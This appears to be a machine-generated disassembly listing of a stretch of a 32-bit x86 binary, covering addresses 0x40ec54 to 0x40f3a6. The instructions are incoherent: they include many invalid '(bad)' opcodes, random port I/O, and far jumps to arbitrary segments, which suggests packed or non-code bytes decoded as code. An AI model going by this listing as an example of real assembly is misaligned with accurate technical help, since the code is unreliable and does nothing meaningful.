  40ec54:	xlat   BYTE PTR ds:[ebx]
  40ec55:	xor    al,0xe9
  40ec57:	out    0xee,al
  40ec59:	sub    DWORD PTR fs:[esi-0x342de8fe],edi
  40ec60:	cmp    eax,0xdb8f674b
  40ec65:	lahf   
  40ec66:	loop   0x40ec42
  40ec68:	fcmovu st,st(0)
  40ec6a:	jne    0x40ec71
  40ec6c:	stos   DWORD PTR es:[edi],eax
  40ec6d:	push   edx
  40ec6e:	add    esp,DWORD PTR [esi-0x2c57b275]
  40ec74:	mov    dl,0x6e
  40ec76:	inc    ecx
  40ec77:	adc    eax,0x1b91f3f8
  40ec7c:	retf   0x6bae
  40ec7f:	popf   
  40ec80:	(bad)  
  40ec81:	dec    esi
  40ec82:	in     eax,0x79
  40ec84:	fistp  QWORD PTR [edi]
  40ec86:	test   al,0x11
  40ec88:	mov    ds:0xa3a52df7,al
  40ec8d:	sub    ebp,DWORD PTR ss:[ebx-0x76]
  40ec91:	lahf   
  40ec92:	mov    edi,0x716ae08
  40ec97:	and    BYTE PTR [ecx],dl
  40ec99:	test   al,0x1f
  40ec9b:	out    0xe5,al
  40ec9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec9e:	ret    0xaa96
  40eca1:	jne    0x40ecfc
  40eca3:	sub    al,0x2e
  40eca5:	in     eax,dx
  40eca6:	(bad)  
  40eca8:	out    dx,al
  40eca9:	(bad)  
  40ecab:	adc    ebx,esi
  40ecad:	call   0x4f1d:0xa8c05bc9
  40ecb4:	test   BYTE PTR [edi],dl
  40ecb6:	outs   dx,DWORD PTR ds:[esi]
  40ecb7:	lock div DWORD PTR [esi+ebp*2-0x546b7060]
  40ecbf:	lea    esp,[edx+0x6b]
  40ecc2:	fs mov bh,0x1e
  40ecc5:	cmp    ah,BYTE PTR [ebp-0x35]
  40ecc8:	dec    edx
  40ecc9:	push   ecx
  40ecca:	inc    ebx
  40eccb:	mov    edi,0x64cc686f
  40ecd0:	and    eax,0x58f7ce9d
  40ecd5:	std    
  40ecd6:	jbe    0x40ec5f
  40ecd8:	xor    al,0xdb
  40ecda:	jns    0x40ec74
  40ecdc:	in     eax,0x76
  40ecde:	mov    ds:0xc94f98fd,al
  40ece3:	sub    al,0x85
  40ece5:	fdivr  QWORD PTR [ebp+0x42]
  40ece8:	mov    cl,0x91
  40ecea:	fcmovne st,st(6)
  40ecec:	(bad)  [edx+0x6c]
  40ecef:	arpl   ax,cx
  40ecf1:	out    dx,al
  40ecf2:	xor    ch,bh
  40ecf4:	mov    dl,BYTE PTR [edx+0x66]
  40ecf7:	pushf  
  40ecf8:	repnz outs dx,BYTE PTR ds:[esi]
  40ecfa:	push   eax
  40ecfb:	iret   
  40ecfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecfd:	mov    dl,BYTE PTR [ecx]
  40ecff:	jnp    0x40ecdd
  40ed01:	cmp    DWORD PTR [ebp+0x6f],ecx
  40ed04:	push   edi
  40ed05:	lods   eax,DWORD PTR ds:[esi]
  40ed06:	pop    edx
  40ed07:	push   es
  40ed08:	or     al,0xfa
  40ed0a:	and    BYTE PTR [edi],dh
  40ed0c:	or     BYTE PTR [esi-0x64],dl
  40ed0f:	push   ss
  40ed10:	sub    esi,eax
  40ed12:	pop    eax
  40ed13:	dec    esp
  40ed14:	sbb    edx,DWORD PTR [ebp+0x244dffd0]
  40ed1a:	sbb    al,0x55
  40ed1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed1d:	xchg   edi,eax
  40ed1e:	out    0x5b,al
  40ed20:	pusha  
  40ed21:	std    
  40ed22:	push   ss
  40ed23:	xlat   BYTE PTR ds:[ebx]
  40ed24:	daa    
  40ed25:	(bad)  
  40ed26:	jg     0x40eda0
  40ed28:	inc    ebp
  40ed29:	(bad)  [eax]
  40ed2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed2c:	xor    al,0xea
  40ed2e:	xlat   BYTE PTR ds:[ebx]
  40ed2f:	loope  0x40eda3
  40ed31:	dec    ecx
  40ed32:	jbe    0x40edab
  40ed34:	repnz dec edx
  40ed36:	add    al,0x58
  40ed38:	daa    
  40ed39:	inc    edx
  40ed3a:	jbe    0x40ece0
  40ed3c:	nop
  40ed3d:	cmp    eax,0x5540efdc
  40ed42:	(bad)  
  40ed43:	ffree  st(7)
  40ed45:	push   cs
  40ed46:	jns    0x40ecf6
  40ed48:	jno    0x40ecd7
  40ed4a:	jmp    0x5bde:0xff6413ef
  40ed51:	add    edx,DWORD PTR [edx+edi*4]
  40ed54:	sbb    edx,0x16
  40ed57:	out    0xd6,al
  40ed59:	jno    0x40ed2c
  40ed5b:	mov    eax,0x24db20be
  40ed60:	xor    al,0x2f
  40ed62:	sub    ebx,DWORD PTR [eax]
  40ed64:	jo     0x40eda9
  40ed66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed67:	(bad)  
  40ed68:	mov    ebx,0x7cc5b5c3
  40ed6d:	jle    0x40ed7c
  40ed6f:	jp     0x40eda9
  40ed71:	(bad)  
  40ed72:	sbb    eax,0x902ef2a5
  40ed77:	and    al,0x15
  40ed79:	sbb    eax,0xfe5a8aef
  40ed7e:	and    DWORD PTR [ebp+ebp*4+0x56],esi
  40ed82:	push   edi
  40ed83:	sar    BYTE PTR [eax+0x3d],0xda
  40ed87:	push   esi
  40ed88:	ror    DWORD PTR [ecx+0x5a],0xd2
  40ed8c:	int3   
  40ed8d:	sub    esp,DWORD PTR [ecx-0x689395f]
  40ed93:	loop   0x40ed5a
  40ed95:	in     al,0x23
  40ed97:	das    
  40ed98:	adc    DWORD PTR [ecx-0x5e859f24],edx
  40ed9e:	xchg   ebx,eax
  40ed9f:	fild   WORD PTR [eax+0x14]
  40eda2:	pop    edx
  40eda3:	mov    eax,ds:0x22e76056
  40eda8:	dec    DWORD PTR [ebx]
  40edaa:	mov    ds:0x72083d57,al
  40edaf:	jl     0x40edd5
  40edb1:	repz cmp BYTE PTR [esp+esi*4+0x4f],cl
  40edb6:	gs adc al,0x63
  40edb9:	repnz adc ah,ah
  40edbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edbd:	mov    ebp,0x619714b1
  40edc2:	call   0xccdd:0x6e14989c
  40edc9:	popa   
  40edca:	fidivr WORD PTR [ebp+0x2e]
  40edcd:	leave  
  40edce:	mov    bl,ah
  40edd0:	pop    edx
  40edd1:	sub    DWORD PTR [eax-0x60511baa],edx
  40edd7:	pop    esi
  40edd8:	into   
  40edd9:	xor    cl,ch
  40eddb:	arpl   WORD PTR [esi-0x3c],bx
  40edde:	push   ecx
  40eddf:	into   
  40ede0:	and    al,BYTE PTR [eax-0x6c]
  40ede3:	push   0xffffff83
  40ede5:	inc    edi
  40ede6:	pop    edi
  40ede7:	jp     0x40eda1
  40ede9:	xor    BYTE PTR [ebx],ch
  40edeb:	mov    eax,0x64005e65
  40edf0:	call   0xd14b:0x81293ad
  40edf7:	sub    al,0x44
  40edf9:	pop    ecx
  40edfa:	xor    al,0x58
  40edfc:	ret    
  40edfd:	add    esp,0xffffffc8
  40ee00:	push   0x2
  40ee02:	add    eax,0xe6f7b728
  40ee07:	stc    
  40ee08:	jmp    0x2166:0x254c4452
  40ee0f:	jecxz  0x40edb8
  40ee11:	xor    bh,ch
  40ee13:	mov    eax,ds:0x30c25bb5
  40ee18:	jns    0x40ee6a
  40ee1a:	mov    ds,WORD PTR [esi]
  40ee1c:	ror    BYTE PTR [esi+0x77],0xbd
  40ee20:	(bad)  
  40ee21:	int3   
  40ee22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee23:	outs   dx,BYTE PTR ds:[esi]
  40ee24:	rcr    BYTE PTR [ebp+esi*4-0x5c72c3bd],1
  40ee2b:	(bad)  
  40ee2c:	dec    edi
  40ee2d:	xlat   BYTE PTR ds:[ebx]
  40ee2e:	pushf  
  40ee2f:	cmp    al,0x1d
  40ee31:	or     BYTE PTR [ebp-0x5905e831],ch
  40ee37:	and    ecx,DWORD PTR [ecx]
  40ee39:	fisub  DWORD PTR [ecx+0x15]
  40ee3c:	or     ebx,DWORD PTR [edx]
  40ee3e:	cld    
  40ee3f:	push   0xb2034203
  40ee44:	(bad)  
  40ee45:	sub    DWORD PTR [edx-0x60],esp
  40ee48:	inc    esi
  40ee49:	xchg   ecx,eax
  40ee4a:	sti    
  40ee4b:	mov    ah,0xcf
  40ee4d:	dec    ecx
  40ee4e:	(bad)  
  40ee4f:	fadd   QWORD PTR [esi+ebx*2-0x5157f3cd]
  40ee56:	imul   ebp,DWORD PTR [ebx-0x4e],0x7cc116f7
  40ee5d:	fs mov bh,0xe5
  40ee60:	inc    ecx
  40ee61:	jbe    0x40eeaf
  40ee63:	fistp  QWORD PTR [ebp+0x6b]
  40ee66:	xchg   edi,eax
  40ee67:	or     edx,DWORD PTR [ecx]
  40ee69:	mov    bh,0x8f
  40ee6b:	les    ecx,FWORD PTR [ebx+0x2632c30d]
  40ee71:	and    eax,0xf6a750b1
  40ee76:	jmp    0x40ee11
  40ee78:	mov    esp,DWORD PTR [edi+0x6873fab6]
  40ee7e:	cs push cs
  40ee80:	lahf   
  40ee81:	retf   
  40ee82:	pop    ecx
  40ee83:	mov    edx,0x7ab4ddf5
  40ee88:	push   ebp
  40ee89:	push   esi
  40ee8a:	repz and al,0x15
  40ee8d:	(bad)  
  40ee8e:	mov    edx,0xe83a5d6c
  40ee93:	cmovne edx,DWORD PTR [edx]
  40ee96:	daa    
  40ee97:	(bad)  
  40ee99:	jmp    0x40ee1b
  40ee9b:	or     esp,edi
  40ee9d:	dec    eax
  40ee9e:	sbb    eax,DWORD PTR [edx+0x36]
  40eea1:	fmulp  st(2),st
  40eea3:	inc    ebp
  40eea4:	imul   DWORD PTR [eax-0x6864671b]
  40eeaa:	mov    al,0x94
  40eeac:	lds    ebx,FWORD PTR [esi-0x1a]
  40eeaf:	sbb    eax,0x99c4ee34
  40eeb4:	dec    ebx
  40eeb5:	shl    BYTE PTR [ebx+edx*1+0x4b795fbf],0xb2
  40eebd:	mov    edx,0xcd8e95ac
  40eec2:	mov    ebp,0xe85d8471
  40eec7:	or     dh,BYTE PTR [ebx+0x71c3fe4c]
  40eecd:	ja     0x40eee9
  40eecf:	js     0x40ef3b
  40eed1:	cmp    edx,DWORD PTR [ecx+0x58]
  40eed4:	(bad)  
  40eed5:	aad    0x45
  40eed7:	pop    ebp
  40eed8:	sar    al,0x11
  40eedb:	mov    ebx,0x7d87862e
  40eee0:	int    0x4e
  40eee2:	add    ebp,ebx
  40eee4:	sub    eax,0xf727721
  40eee9:	out    dx,eax
  40eeea:	cmp    eax,0x38d07a89
  40eeef:	dec    esp
  40eef0:	lds    esi,FWORD PTR [eax-0x3c639046]
  40eef6:	gs add eax,0xd48b1b39
  40eefc:	lds    ebp,FWORD PTR [ecx+0x58212857]
  40ef02:	cmc    
  40ef03:	mov    ch,0xfc
  40ef05:	push   0x4c
  40ef07:	lods   al,BYTE PTR ds:[esi]
  40ef08:	mov    dh,0xf3
  40ef0a:	std    
  40ef0b:	or     ch,BYTE PTR cs:[edi+eiz*2]
  40ef0f:	xor    esp,edx
  40ef11:	aaa    
  40ef12:	fdivr  st(0),st
  40ef14:	xor    eax,0xf23eb399
  40ef19:	mov    esi,0xaa62cc1a
  40ef1e:	mov    ah,0x8a
  40ef20:	imul   ebp,DWORD PTR [ecx],0x28
  40ef23:	scas   al,BYTE PTR es:[edi]
  40ef24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef25:	sar    BYTE PTR [eax+edx*4+0x4510ac30],1
  40ef2c:	jns    0x40eeb1
  40ef2e:	shl    BYTE PTR [ebx+esi*1+0x3a],cl
  40ef32:	outs   dx,DWORD PTR ds:[esi]
  40ef33:	adc    DWORD PTR [ebp+0x7d],ecx
  40ef36:	and    BYTE PTR [esi],0xfc
  40ef39:	sub    dh,ah
  40ef3b:	or     BYTE PTR [edi],dl
  40ef3d:	mov    ch,0x81
  40ef3f:	push   ebx
  40ef40:	pop    ebx
  40ef41:	push   0x1b
  40ef43:	mov    dh,0xdb
  40ef45:	les    edx,FWORD PTR [edi-0x75891f84]
  40ef4b:	inc    eax
  40ef4c:	cmp    ah,BYTE PTR [edi-0x63838d50]
  40ef52:	leave  
  40ef53:	xor    esi,DWORD PTR cs:[esi]
  40ef56:	sbb    bl,BYTE PTR [edi]
  40ef58:	(bad)  
  40ef59:	mov    al,ds:0xefeed31a
  40ef5e:	xchg   edx,eax
  40ef5f:	sbb    al,0x33
  40ef61:	pop    esi
  40ef62:	popa   
  40ef63:	xlat   BYTE PTR ds:[ebx]
  40ef64:	retf   0xa219
  40ef67:	(bad)  
  40ef68:	aas    
  40ef69:	pop    edx
  40ef6a:	push   ss
  40ef6b:	out    dx,al
  40ef6c:	loop   0x40ef4d
  40ef6e:	div    BYTE PTR [ecx+0x743196c9]
  40ef74:	push   ebp
  40ef75:	daa    
  40ef76:	in     eax,dx
  40ef77:	mov    ds:0xd7efde7d,al
  40ef7c:	arpl   WORD PTR [ebp-0x78172ec2],si
  40ef82:	cmc    
  40ef83:	test   eax,0x156e0d33
  40ef88:	sub    ebp,DWORD PTR [esi-0x1ff75684]
  40ef8e:	aad    0x30
  40ef90:	jge    0x40f009
  40ef92:	mov    dh,0x35
  40ef94:	and    eax,0xf8fd7f1a
  40ef99:	mov    edi,0xf592c081
  40ef9e:	jge    0x40efe0
  40efa0:	jg     0x40ef64
  40efa2:	adc    eax,0x2987942c
  40efa7:	(bad)  
  40efa8:	ss call 0x1317:0xef2ac25e
  40efb0:	add    bl,BYTE PTR [eax+0x3d1e072e]
  40efb6:	hlt    
  40efb7:	rcr    DWORD PTR [edi],1
  40efb9:	mov    ecx,DWORD PTR [edx+0x3fa94055]
  40efbf:	out    dx,al
  40efc0:	add    BYTE PTR [eax+0x5b40f4b1],ch
  40efc6:	sbb    al,0x59
  40efc8:	imul   ebx
  40efca:	jmp    0x32e0d9c
  40efcf:	in     eax,dx
  40efd0:	aaa    
  40efd1:	(bad)  
  40efd2:	in     al,dx
  40efd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efd5:	inc    edi
  40efd6:	imul   BYTE PTR [esi+0x46]
  40efd9:	addr16 and al,0xff
  40efdc:	dec    ebp
  40efdd:	adc    DWORD PTR [eax+eiz*1],ebp
  40efe0:	xchg   DWORD PTR ss:[ecx+0x3c],ebp
  40efe4:	inc    ecx
  40efe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efe6:	jge    0x40ef7d
  40efe8:	and    DWORD PTR [eax],ebp
  40efea:	sub    ch,dl
  40efec:	jbe    0x40f035
  40efee:	aad    0xc0
  40eff0:	aam    0xb5
  40eff2:	jecxz  0x40efea
  40eff4:	and    al,BYTE PTR ds:0x66874197
  40effa:	sub    DWORD PTR [ecx],edi
  40effc:	lods   eax,DWORD PTR ds:[esi]
  40effd:	inc    eax
  40effe:	push   cs
  40efff:	iret   
  40f000:	aam    0x99
  40f002:	sbb    ch,BYTE PTR [edi+0x60]
  40f005:	pusha  
  40f006:	daa    
  40f007:	and    eax,0x68d9413
  40f00c:	lahf   
  40f00d:	pop    edi
  40f00e:	pop    edx
  40f00f:	out    dx,eax
  40f010:	sub    BYTE PTR [ebp-0x7cd7a758],bl
  40f016:	fmul   QWORD PTR [ebp+0x33e285cf]
  40f01c:	pop    ecx
  40f01d:	outs   dx,DWORD PTR ds:[esi]
  40f01e:	enter  0xcda9,0x79
  40f022:	cmc    
  40f023:	cwde   
  40f024:	pop    esp
  40f025:	and    al,0xbe
  40f027:	push   ds
  40f028:	xchg   ecx,eax
  40f029:	ja     0x40f075
  40f02b:	shl    BYTE PTR [ecx+0x2c5636b0],cl
  40f031:	adc    esp,DWORD PTR [esi-0x3]
  40f034:	std    
  40f035:	jmp    0xf710e506
  40f03a:	pop    edi
  40f03b:	mov    ebp,0xdd8b151d
  40f040:	loope  0x40f0a7
  40f042:	cmp    DWORD PTR [esi-0x45],0x482d2baa
  40f049:	mov    ebp,0xb7121a42
  40f04e:	cmp    dh,BYTE PTR [edi-0x7521849]
  40f054:	clc    
  40f055:	push   esp
  40f056:	mov    ebp,0xd1bae28a
  40f05b:	mov    ?,WORD PTR [eax-0x42]
  40f05e:	pop    es
  40f05f:	sahf   
  40f060:	arpl   bp,di
  40f062:	pop    ss
  40f063:	jne    0x40f0a3
  40f065:	and    al,0x10
  40f067:	jnp    0x40f003
  40f069:	pop    ebp
  40f06a:	pop    ebp
  40f06b:	inc    esp
  40f06c:	test   al,0x49
  40f06e:	cld    
  40f06f:	(bad)  
  40f071:	rcl    dh,cl
  40f073:	sub    cl,BYTE PTR [ebp-0x17357ef1]
  40f079:	mov    BYTE PTR [edi-0x291b5d3e],ah
  40f07f:	mov    dl,BYTE PTR [edx+0xf]
  40f082:	icebp  
  40f083:	push   0xffffffb2
  40f085:	out    dx,eax
  40f086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f087:	adc    BYTE PTR [ebp-0x7d],bl
  40f08a:	cmp    BYTE PTR [eax],ah
  40f08c:	sub    cl,BYTE PTR ds:0x62cad206
  40f092:	ret    0x4258
  40f095:	pop    edi
  40f096:	sub    bh,ah
  40f098:	xchg   edi,eax
  40f099:	cmp    DWORD PTR [edi+0x7abd02fc],edi
  40f09f:	pop    esi
  40f0a0:	ret    
  40f0a1:	into   
  40f0a2:	addr16 aaa 
  40f0a4:	push   ebp
  40f0a5:	shl    BYTE PTR [edx+0x9f68349],1
  40f0ab:	iret   
  40f0ac:	imul   esp,DWORD PTR [ebx],0x182419c4
  40f0b2:	xor    eax,0xa58bdff5
  40f0b7:	mov    dh,0xa6
  40f0b9:	mov    WORD PTR [esi+0x4b96df32],ss
  40f0bf:	jb     0x40f078
  40f0c1:	push   cs
  40f0c2:	xchg   esp,eax
  40f0c3:	leave  
  40f0c4:	fmul   QWORD PTR [edi]
  40f0c6:	adc    edx,DWORD PTR [ebp+0x7d]
  40f0c9:	pop    ds
  40f0ca:	adc    BYTE PTR [edx*2-0x59a5a874],0xd
  40f0d2:	jns    0x40f087
  40f0d4:	test   eax,0x491ff9e2
  40f0d9:	or     eax,0x455084fd
  40f0de:	fisubr WORD PTR [ecx]
  40f0e0:	pushf  
  40f0e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0e2:	push   ebp
  40f0e3:	jno    0x40f0fb
  40f0e5:	stos   DWORD PTR es:[edi],eax
  40f0e6:	call   0xc9d5:0x8c20a244
  40f0ed:	lea    esi,[ebx]
  40f0ef:	jns    0x40f0b2
  40f0f1:	paddd  mm5,mm0
  40f0f4:	out    0xe0,eax
  40f0f6:	and    BYTE PTR [esi+eiz*1],bl
  40f0f9:	lods   al,BYTE PTR ds:[esi]
  40f0fa:	cmp    eax,0x1dd652b5
  40f0ff:	xchg   esp,eax
  40f100:	dec    ebx
  40f101:	sub    edx,0xffffffd5
  40f104:	adc    ebx,DWORD PTR [eax+0x3b89cd7f]
  40f10a:	xchg   edx,eax
  40f10b:	add    eax,0x2faa576f
  40f110:	ins    BYTE PTR es:[edi],dx
  40f111:	aad    0x3
  40f113:	sub    esp,eax
  40f115:	fst    st(6)
  40f117:	cwde   
  40f118:	xchg   cl,bh
  40f11a:	push   ecx
  40f11b:	enter  0x5271,0x73
  40f11f:	inc    ecx
  40f120:	pop    ebx
  40f121:	mov    ch,0x86
  40f123:	test   DWORD PTR fs:[ebx],eax
  40f126:	rol    DWORD PTR [ecx],0xb0
  40f129:	cmp    ebx,DWORD PTR [ecx-0x15]
  40f12c:	adc    al,BYTE PTR [eax]
  40f12e:	(bad)  
  40f12f:	pusha  
  40f130:	push   0xf
  40f132:	fwait
  40f133:	mov    ch,0x41
  40f135:	aas    
  40f136:	or     ecx,DWORD PTR [edi-0x9]
  40f139:	fcmovbe st,st(2)
  40f13b:	retf   
  40f13c:	lea    esp,[ebx-0x755b6521]
  40f142:	jnp    0x40f0fa
  40f144:	and    eax,DWORD PTR [eax+0x54a481dc]
  40f14a:	adc    DWORD PTR [esi],ebp
  40f14c:	push   0x83a18dac
  40f151:	cdq    
  40f152:	repz (bad) 
  40f155:	push   esi
  40f156:	pop    es
  40f157:	xor    bh,BYTE PTR [esi]
  40f159:	fldenv [ebx]
  40f15b:	(bad)  
  40f15d:	add    esi,DWORD PTR [eax-0x24]
  40f160:	fimul  WORD PTR [edx]
  40f162:	loope  0x40f154
  40f164:	imul   esi,DWORD PTR [esi-0x3d],0xffffffde
  40f168:	leave  
  40f169:	out    dx,eax
  40f16a:	dec    esi
  40f16b:	aam    0xb3
  40f16d:	add    DWORD PTR [edx-0x2880d664],edx
  40f173:	sub    BYTE PTR [esi],dl
  40f175:	inc    esp
  40f176:	cmp    eax,0xedf4c197
  40f17b:	cmc    
  40f17c:	fsub   QWORD PTR [ecx-0x2b]
  40f17f:	ret    0xac87
  40f182:	xchg   edi,eax
  40f183:	mov    ecx,0x77139bb4
  40f188:	lods   al,BYTE PTR ds:[esi]
  40f189:	leave  
  40f18a:	push   0xffffff8b
  40f18c:	outs   dx,DWORD PTR ds:[esi]
  40f18d:	jecxz  0x40f185
  40f18f:	iret   
  40f190:	imul   edi,edx,0xffffffc0
  40f193:	out    0xd0,al
  40f195:	pop    esp
  40f196:	je     0x40f118
  40f198:	inc    ebx
  40f199:	adc    BYTE PTR [esi+ecx*4+0x33],ah
  40f19d:	dec    eax
  40f19e:	jo     0x40f121
  40f1a0:	das    
  40f1a1:	les    ecx,FWORD PTR [eax+ebx*1]
  40f1a4:	aas    
  40f1a5:	jg     0x40f1f7
  40f1a7:	mov    edx,0xd972dcdf
  40f1ac:	je     0x40f15f
  40f1ae:	xchg   DWORD PTR [edx+0x62],ecx
  40f1b1:	pop    ebp
  40f1b2:	test   al,0x80
  40f1b4:	sub    ecx,esp
  40f1b6:	xchg   ebp,eax
  40f1b7:	cwde   
  40f1b8:	scas   eax,DWORD PTR es:[edi]
  40f1b9:	mov    dh,0x42
  40f1bb:	fcom   DWORD PTR [edx-0x42]
  40f1be:	jo     0x40f15d
  40f1c0:	clc    
  40f1c1:	gs jne 0x40f1ff
  40f1c4:	in     eax,dx
  40f1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c6:	sub    ecx,DWORD PTR [edi-0x76fbe691]
  40f1cc:	dec    esp
  40f1cd:	pop    edx
  40f1ce:	int    0x1d
  40f1d0:	neg    BYTE PTR [eax-0x51a18332]
  40f1d6:	ret    
  40f1d7:	lahf   
  40f1d8:	iret   
  40f1d9:	fiadd  DWORD PTR [esp+edx*2]
  40f1dc:	shr    esp,cl
  40f1de:	inc    edx
  40f1df:	daa    
  40f1e0:	ret    0x7b30
  40f1e3:	jne    0x40f16a
  40f1e5:	sub    edx,DWORD PTR [ebx+ebp*1+0x19]
  40f1e9:	imul   DWORD PTR [ecx]
  40f1eb:	sub    BYTE PTR [ebp-0x4f],cl
  40f1ee:	(bad)  
  40f1ef:	out    0xfc,eax
  40f1f1:	xchg   edx,edi
  40f1f3:	cmp    bh,BYTE PTR [eax+ebp*4-0x19]
  40f1f7:	ss inc ebp
  40f1f9:	call   0x52599273
  40f1fe:	(bad)  
  40f1ff:	jmp    0x4f6df3ca
  40f204:	clc    
  40f205:	dec    cx
  40f207:	int3   
  40f208:	daa    
  40f209:	je     0x40f248
  40f20b:	into   
  40f20c:	xor    ecx,DWORD PTR [edi+eiz*4+0x4fcdf4f8]
  40f213:	(bad)  
  40f214:	fistp  DWORD PTR [edx-0x48]
  40f217:	ret    0xb1d7
  40f21a:	jae    0x40f282
  40f21c:	fwait
  40f21d:	mov    al,0x87
  40f21f:	inc    edx
  40f220:	aam    0x13
  40f222:	mov    esp,0xe8c1189f
  40f227:	(bad)  
  40f229:	fucom  st(3)
  40f22b:	imul   ecx,DWORD PTR [ebx+edi*1],0x5
  40f22f:	shl    DWORD PTR [edi],1
  40f231:	in     eax,dx
  40f232:	ret    0x12ef
  40f235:	and    DWORD PTR [ebx+edi*1],ecx
  40f238:	sahf   
  40f239:	sbb    al,0x31
  40f23b:	pop    ss
  40f23c:	int    0xd5
  40f23e:	and    DWORD PTR [esi-0x790eddcf],edx
  40f244:	cwde   
  40f245:	jge    0x40f21f
  40f247:	xchg   edx,eax
  40f248:	sahf   
  40f249:	mov    ebp,0x6c2a7082
  40f24e:	retf   
  40f24f:	arpl   cx,bx
  40f251:	rcr    BYTE PTR [ecx+0x18ed8403],1
  40f257:	rcl    BYTE PTR [edx-0x2a],1
  40f25a:	retf   0xe88c
  40f25d:	push   esi
  40f25e:	add    ecx,eax
  40f260:	pop    esi
  40f261:	cmp    BYTE PTR [eax-0x51],bl
  40f264:	es pop eax
  40f266:	jns    0x40f2b6
  40f268:	jns    0x40f1f8
  40f26a:	aam    0x44
  40f26c:	jb     0x40f209
  40f26e:	sbb    ch,al
  40f270:	push   es
  40f271:	jge    0x40f277
  40f273:	jl     0x40f2c2
  40f275:	push   esp
  40f276:	(bad)  
  40f277:	xor    esi,DWORD PTR [ebx+0x5c5c1427]
  40f27d:	cwde   
  40f27e:	fimul  WORD PTR [ebx-0x5b4fd608]
  40f284:	xor    bh,BYTE PTR [edx+0x5e]
  40f287:	lahf   
  40f288:	adc    edx,DWORD PTR [esi]
  40f28a:	sbb    DWORD PTR [ebp-0x8],ebp
  40f28d:	jae    0x40f2b8
  40f28f:	call   0xb4075e4e
  40f294:	in     al,0x70
  40f296:	jmp    DWORD PTR [edi]
  40f298:	aam    0x45
  40f29a:	in     eax,dx
  40f29b:	sbb    dl,BYTE PTR [ebx+0x5c]
  40f29e:	dec    edx
  40f29f:	nop
  40f2a0:	push   ds
  40f2a1:	aas    
  40f2a2:	push   ebp
  40f2a3:	pop    eax
  40f2a4:	jmp    0x40f2c5
  40f2a6:	lar    eax,WORD PTR [esi-0x10]
  40f2aa:	xor    al,0x16
  40f2ac:	dec    ecx
  40f2ad:	fisttp DWORD PTR [eax]
  40f2af:	adc    BYTE PTR [edx+0x1b042663],ch
  40f2b5:	jmp    0xc935ad80
  40f2ba:	jae    0x40f296
  40f2bc:	sti    
  40f2bd:	out    0x20,al
  40f2bf:	jne    0x40f2a0
  40f2c1:	adc    eax,0x975ed870
  40f2c6:	jg     0x40f2be
  40f2c8:	mov    al,ds:0x2717331
  40f2cd:	cmp    BYTE PTR [edi],dl
  40f2cf:	push   0x8d5f0e6d
  40f2d4:	pop    ss
  40f2d5:	lock mov DWORD PTR [ecx-0x6d6db6a2],0xb39b8170
  40f2e0:	mov    cl,BYTE PTR [edx]
  40f2e2:	cmp    DWORD PTR [esi+ebx*4+0x40],0x8adbe423
  40f2ea:	jle    0x40f27c
  40f2ec:	and    ebp,ecx
  40f2ee:	cld    
  40f2ef:	xchg   edi,eax
  40f2f0:	dec    esp
  40f2f1:	dec    esp
  40f2f2:	sbb    ecx,DWORD PTR [esi-0x2d]
  40f2f5:	and    DWORD PTR [esi],esi
  40f2f7:	idiv   ch
  40f2f9:	adc    al,0x73
  40f2fb:	push   edi
  40f2fc:	xchg   edx,eax
  40f2fd:	test   al,0x90
  40f2ff:	out    dx,al
  40f300:	sbb    eax,0xa535a90a
  40f305:	fst    DWORD PTR [esi]
  40f308:	xchg   ch,ch
  40f30a:	ficom  WORD PTR [edi+0x30f195bf]
  40f310:	ja     0x40f36a
  40f312:	xor    ecx,ecx
  40f314:	je     0x40f29c
  40f316:	imul   esi,DWORD PTR [edx-0x1f9aafb2],0xdf52055
  40f320:	scas   al,BYTE PTR es:[edi]
  40f321:	sti    
  40f322:	repnz inc ebx
  40f324:	(bad)
  40f328:	sub    eax,0xf5bb6e52
  40f32d:	outs   dx,BYTE PTR ds:[esi]
  40f32e:	inc    esp
  40f32f:	xchg   ecx,eax
  40f330:	xor    eax,0xda1978ed
  40f335:	mov    ebx,0xa339b7e7
  40f33a:	scas   al,BYTE PTR es:[edi]
  40f33b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f33c:	mov    al,0x9a
  40f33e:	adc    al,0x86
  40f340:	jo     0x40f35a
  40f342:	cdq    
  40f343:	cdq    
  40f344:	int    0x4c
  40f346:	pop    eax
  40f347:	lahf   
  40f348:	fcomp  QWORD PTR [edx-0x18560a26]
  40f34e:	fidivr WORD PTR [eax]
  40f350:	loopne 0x40f393
  40f352:	ja     0x40f353
  40f354:	sbb    ebp,esi
  40f356:	push   ecx
  40f357:	sahf   
  40f358:	rcl    cl,cl
  40f35a:	sub    eax,0xa60b14aa
  40f35f:	pop    edx
  40f360:	jmp    0x55ce:0x81d9f31
  40f367:	es sub al,0x95
  40f36a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f36b:	je     0x40f311
  40f36d:	dec    edi
  40f36e:	frndint 
  40f370:	inc    edi
  40f371:	mov    ebx,0xac26de7b
  40f376:	jmp    0x6443fcec
  40f37b:	cmp    bl,dh
  40f37d:	leave  
  40f37e:	sti    
  40f37f:	inc    esp
  40f380:	lods   al,BYTE PTR ss:[esi]
  40f382:	bound  edi,QWORD PTR [esi+0x456760c8]
  40f388:	xchg   ebp,eax
  40f389:	sbb    dh,BYTE PTR [esi]
  40f38b:	cmp    BYTE PTR [esi],dh
  40f38d:	in     al,0xd5
  40f38f:	out    dx,al
  40f390:	inc    esi
  40f391:	add    BYTE PTR [ecx],dl
  40f393:	jle    0x40f341
  40f395:	sub    eax,0x53c628f
  40f39a:	retf   0xecb
  40f39d:	push   ds
  40f39e:	outs   dx,BYTE PTR ds:[esi]
  40f39f:	adc    eax,0x78ecb8ac
  40f3a4:	out    0xe0,al
  40f3a6:	out    0x3f,al
